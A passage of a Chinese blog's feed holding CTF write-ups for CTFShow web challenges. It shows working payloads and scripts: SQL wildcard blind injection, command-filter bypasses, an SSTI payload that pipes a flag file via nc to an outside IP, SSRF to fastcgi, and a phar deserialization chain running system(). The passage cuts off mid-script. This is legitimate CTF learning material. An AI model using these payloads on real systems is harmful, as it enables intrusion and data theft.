class="string">&#x27;0e&#x27;</span> + str(id) + <span class="string">&#x27;024452&#x27;</span></span><br><span class="line">    <span class="comment"># d = &#x27;0e&#x27; + str(id) + &#x27;024452&#x27;</span></span><br><span class="line">    enc = md2(d)</span><br><span class="line">    <span class="keyword">if</span> enc[:<span class="number">2</span>] == <span class="string">&#x27;0e&#x27;</span> <span class="keyword">and</span> enc[<span class="number">2</span>:].isdigit():</span><br><span class="line">        print(d)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>, <span class="number">99999</span>):</span><br><span class="line">        <span class="keyword">if</span> check(i):</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>最后b=0e652024452，c=0e603448399</p><p>最后一关php会将不认识的协议当作目录，payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;1e-300&amp;b&#x3D;0e652024452&amp;c&#x3D;0e603448399</span><br><span class="line">POST: url&#x3D;a:&#x2F;&#x2F;ctfshow.com&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;fl0g.txt</span><br></pre></td></tr></table></figure><h3 id="web3-莫负婵娟">web3_莫负婵娟</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--注意：正式上线请删除注释内容！ --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- username yu22x --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- SELECT * FROM users where username like binary(&#x27;$username&#x27;) and password like binary(&#x27;$password&#x27;)--&gt;</span></span><br></pre></td></tr></table></figure><p>测试后发现过滤了<code>' &quot; \ - # % () ^ union, select, sleep </code>等等，闭合sql语句注入应该不行了，再看下发现比较时是<code>like</code>，想到sql通配符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%：用来表示0个或多个字符</span><br><span class="line">_：用来表示任意单个字符</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201029192410.png" alt=""></p><p>当测试到32个<code>_</code>字符时，回显发生了变化，简单来说应该是盲注了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;&quot;http://c8b61d08-4760-4f23-834c-eccc201ee37d.chall.ctf.show/login.php&quot;&quot;&quot;</span></span><br><span class="line">strings = string.ascii_letters + string.digits</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">        payload = flag + s + (<span class="number">32</span>-i) * <span class="string">&#x27;_&#x27;</span></span><br><span class="line">        data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;yu22x&quot;</span>, <span class="string">&quot;password&quot;</span>: payload&#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;wrong&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += s</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment"># 67815b0c009ee970fe4014abaa3Fa6A0</span></span><br></pre></td></tr></table></figure><p>登录后发现是一个curl命令执行界面，过滤了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小写字母 | () &#x2F; \ &#96; * , &lt; &gt; !</span><br></pre></td></tr></table></figure><p>还可以使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">大写字母 ? $ &#123; &#125; : ; .</span><br></pre></td></tr></table></figure><p>一开始想到DNSLOG外带数据，后来发现可以直接访问VPS外带数据。</p><p>题目提示使用环境变量 +linux字符串截取 + 通配符，Linux下环境变量<code>$PATH</code>、<code>$PWD</code>、<code>$HOME</code></p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201029195420.png" style="zoom:50%;" /><p>再用Linux字符串截断获取<code>cat</code>，以及用通配符表示<code>flag.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip&#x3D;127.0.0.1;$&#123;PATH:7:1&#125;$&#123;PATH:8:1&#125;$&#123;HOME:12:1&#125; ????.???</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CTFShow-Web-Writeup&quot;&gt;CTFShow Web Writeup&lt;/h1&gt;
&lt;h2 id=&quot;web入门-命令执行&quot;&gt;web入门 命令执行&lt;/h2&gt;
&lt;h3 id=&quot;web29&quot;&gt;web29&lt;/h3&gt;
&lt;p&gt;考点：通配符绕过&lt;/p&gt;
&lt;figure 
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTFShow_1024杯_Web_Writeup</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/24.CTFShow-1024%E6%9D%AF-Web-Writeup/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/24.CTFShow-1024%E6%9D%AF-Web-Writeup/</id>
    <published>2020-10-29T09:15:33.000Z</published>
    <updated>2020-11-16T05:05:07.139Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTFShow-1024杯-Web-Writeups">CTFShow 1024杯 Web Writeups</h1><h2 id="签到">签到</h2><p>一开始以为是无参数RCE，后来又Fuzz了PHP所有内置函数，趴着睡觉的时候突然灵光一现，刚刚好像看到出题人自定义了一个函数<code>ctfshow()</code>，直接使用这个函数即可。</p><h2 id="fastapi">fastapi</h2><p>直接去github上看fastapi的文档，发现它会自带Swagger UI文档，路径为<code>/docs</code>或者<code>/redoc</code><br>根据这个api文档可以发现有一个POST接口<code>cccalccc</code>的参数p存在模板注入，fuzz一波之后发现还有过滤，ban掉了<code>open</code>,<code>eval</code>,<code>import</code>等关键字。但是payload只有搜集的够全面，就没有做不出来的SSTI。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q&#x3D;[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;system&#39;](&#39;cat &#x2F;mnt&#x2F;f1a9|nc 47.97.199.89 8888&#39;)</span><br></pre></td></tr></table></figure><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/6DDDDE6F-2500-4258-9546-5E5527F4FC76.png" style="zoom:50%;" />这里还有一个坑点就是，如果反弹shell的话会监听这边直接挂掉，只能每次单独的执行Linux命令。<p>payload来源： <a href="https://blog.csdn.net/weixin_43536759/article/details/105066445">https://blog.csdn.net/weixin_43536759/article/details/105066445</a></p><p>另外还有一些其他无回显注入的方法： <a href="https://www.anquanke.com/post/id/188172#h2-12">https://www.anquanke.com/post/id/188172#h2-12</a></p><p>因为没有curl命令所以好像不能用DNSLOG的方法。</p><p>出题人的官方payload，使用时间盲注：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str(().__class__.__bases__[0].__subclasses__()[220](&quot;if [ &#96;cut -c 1 &#x2F;mnt&#x2F;f1a9&#96; &#x3D; &#39;f&#39; ];then sleep 4;fi&quot;,shell&#x3D;True).wait())</span><br></pre></td></tr></table></figure><h2 id="图片代理">图片代理</h2><p>打开题目显示一张图片，看URL还有<code>?picurl</code>参数，感觉是SSRF了，但是还得看看接下来怎么继续利用。<br>首先用gopher协议验证一下是否确定是SSRF。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201028135548.png" alt=""></p><p>没毛病，确实是存在SSRF漏洞，再用dict协议看看有没有开放常用端口，比如redis的6379啥的。</p><p>一轮Fuzz下来只有80端口有回显，然后我又猜测会不会有其他的内网存活主机，又扫了一波没什么收获。然后用file协议读取本地文件的时候我好想忘了base64编码，结果以为是无回显的SSRF，又尝试了用DNSLOG外带数据等等，还是没能打出来。<br>直到比赛结束后我才突然想到没有编码。。。（人傻了。。。</p><p>先读/etc/passwd正常回显，既然没有其他端口开着服务，那就去看Nginx的默认配置<code>/etc/nginx/conf.d/default.conf</code></p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201028135617.png" style="zoom:50%;" /><p>好吧，明明9000端口有fastcgi，为啥刚刚扫不到。用Gopherus本地生成fastcgi的payload</p><p>然后base64编码打过去拿到flag。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201028135643.png" alt=""></p><h2 id="柏拉图">柏拉图</h2><p>说实在的做这题的时候没考虑周全。。readfile.php不能读文件，index.php可以读文件。</p><p>双写绕过：file:/file:////var/www/html/index.php</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    $url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    $bad = <span class="string">&#x27;file://&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/dict|127|localhost|sftp|Gopherus|http|\.\.\/|flag|[0-9]/is&#x27;</span>, $url,$match))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;难道我不知道你在想什么？除非绕过我？！&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      $url=str_replace($bad,<span class="string">&quot;&quot;</span>,$url);</span><br><span class="line">      curl($url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span> (($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/gif&quot;</span>)&amp;&amp;(substr($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>))== <span class="string">&#x27;gif&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">&quot;upload/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">      <span class="keyword">echo</span> $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在啦！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> .$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;文件存储在: &quot;</span> . <span class="string">&quot;upload/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;这个文件我不喜欢，我喜欢一个gif的文件&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Readfile.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$filename</span>)</span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/^phar|^smtp|^dict|^zip|file|etc|root|filter|\.\.\//i&quot;</span>,$filename))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;姿势太简单啦，来一点骚的？！&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">    $file=$_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(strstr($file, <span class="string">&quot;flag&quot;</span>) || check($file) || strstr($file, <span class="string">&quot;php&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;这么简单的获得不可能吧？！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> readfile($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>unlink.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file=$_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$file</span>)</span>&#123;  </span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="string">&quot;/\.\.\//i&quot;</span>,$file))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;你想干什么？！&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> $file;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="string">&quot;upload/&quot;</span>.$file))&#123;</span><br><span class="line">      <span class="keyword">if</span>(unlink(<span class="string">&quot;upload/&quot;</span>.check($file)))&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;删除&quot;</span>.$file.<span class="string">&quot;成功！&quot;</span>;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;删除&quot;</span>.$file.<span class="string">&quot;失败！&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;要删除的文件不存在！&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$a</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = $a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;THI IS CTFSHOW&quot;</span>.<span class="keyword">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$b</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = $b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;b)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$c</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;c = $c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>有反序列化有上传，应该就是PHP反序列化+Phar上传。构造这个POP链还是比较简单的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;phar.readonly&#x27;</span>,<span class="string">&#x27;Off&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$a</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = $a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$c</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;c = $c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//@unlink(&quot;phar1.phar&quot;);//unlink() 函数删除文件。</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();<span class="comment">//开始缓冲Phar写操作</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">$A = <span class="keyword">new</span> A(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">$B = <span class="keyword">new</span> B(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">$C = <span class="keyword">new</span> C(<span class="string">&#x27;system(&quot;cat /ctfshow_1024_flag.txt&quot;);&#x27;</span>);</span><br><span class="line">$A-&gt;a=$B;</span><br><span class="line">$B-&gt;b=$C;</span><br><span class="line">$phar-&gt;setMetadata($A);<span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);<span class="comment">//以字符串的形式添加一个文件到phar档案添 加要压缩的文件 //签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="comment">//compress.zlib://phar://xxx</span></span><br><span class="line"><span class="comment">//compress.zlib://phar://1.gif</span></span><br></pre></td></tr></table></figure><p>更改后缀名为gif上传，再在readfile界面使用伪协议<code>compress.zlib://phar://upload/phar.gif</code>执行命令。</p><h2 id="hello-world">hello_world</h2><p>考察SSTI盲注，使用<code>\x5f</code>绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;&quot;http://7f6bd375-3951-484c-8ad4-b212bc83b878.chall.ctf.show/&quot;&quot;&quot;</span></span><br><span class="line">strings = string.digits + string.ascii_lowercase + <span class="string">&#x27;-&#x27;</span> + <span class="string">&#x27;&#123;&#x27;</span> + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&quot;ca01h&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">        payload = <span class="string">&#x27;&#x27;&#x27;&#123;% set chr=&quot;&quot;[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;][&quot;\\x5F\\x5Fbase\\x5F\\x5F&quot;][&quot;\\x5F\\x5Fsubclasses\\x5F\\x5F&quot;]()[65] [&quot;\\x5F\\x5Finit\\x5F\\x5F&quot;][&quot;\\x5F\\x5Fglobals\\x5F\\x5F&quot;] [&quot;\\x5F\\x5Fbuiltins\\x5F\\x5F&quot;][&quot;chr&quot;] %&#125;&#123;% if &quot;&quot; [&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;][&quot;\\x5F\\x5Fbase\\x5F\\x5F&quot;] [&quot;\\x5F\\x5Fsubclasses\\x5F\\x5F&quot;]()[65][&quot;\\x5F\\x5Finit\\x5F\\x5F&quot;] [&quot;\\x5F\\x5Fglobals\\x5F\\x5F&quot;][&quot;\\x5F\\x5Fbuiltins\\x5F\\x5F&quot;][&quot;eval&quot;](&quot;\\x5F\\x5Fimport\\x5F\\x5F(chr(111)+chr(115))&quot;)[chr(112)+chr(111)+chr(112)+chr(101)+chr(110)](chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(99)+chr(42))[&quot;read&quot;]() [&#x27;&#x27;&#x27;</span>+str(i)+<span class="string">&#x27;&#x27;&#x27;]==&quot;&#x27;&#x27;&#x27;</span>+s+<span class="string">&#x27;&#x27;&#x27;&quot; %&#125; ca01h&#123;% endif %&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        res = requests.post(url, data=&#123;<span class="string">&quot;key&quot;</span>: payload&#125;)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> res.text:</span><br><span class="line">            print(s)</span><br><span class="line">            result += s</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> result[<span class="number">-1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span 